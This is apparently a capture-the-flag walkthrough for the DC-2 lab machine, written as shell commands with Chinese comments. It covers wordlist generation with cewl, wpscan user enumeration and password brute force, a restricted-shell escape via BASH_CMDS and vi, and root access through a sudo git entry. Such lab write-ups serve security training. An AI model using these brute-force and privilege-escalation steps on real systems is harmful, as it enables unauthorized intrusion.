````apl
1. cewl http://dc-2 -w /root/Desktop/pass.txt   # 访问web页面发现flag 提示需要使用 cewl 工具-根据web页面生成字典的工具   是word press  的CMS
2. wpscan --url dc-2 -e u  # 因为CMS是word press 直接使用 wpscan  爆破用户名  把扫出来得 admin jerry tom保存到桌面 user.txt nano /root/Desktop/user.txt   
3. wpscan --url http://dc-2 -U /root/Desktop/users.txt -P /root/Desktop/pass.txt  # 使用 wpscan 爆破  出了 2组账户密码
4. dirsearch -u http://dc-2 # 扫描目录  找到登录页面  使用上述账户密码登录即可 这里使用 jerry  登录后查看 flag 和 flag2 flag2提示可以使用别的方式登录  这里尝试使用ssh进入
5. ssh tom@RHORST -p 7744 输入密码登录ssh即可
6. BASH_CMDS[a]=/bin/sh;a # 进入后发现shell是被限制的 提权获取正常shell
6.1 vi rk  # 输入一下内容
	:set shell=/bin/sh
	:shell
7. export PATH=$PATH:/bin    export PATH=$PATH:/usr/bin   #添加环境变量  
8. su jerry  输入密码后 获得新的shell  # 获取后 需要切换到Jerry 目录下 发现flag4.txt  
9. sudo -l #查询一下 获得  (root) NOPASSWD: /usr/bin/git  可以使用git提权
10. sudo  git help config        !/bin/bash  提权
````

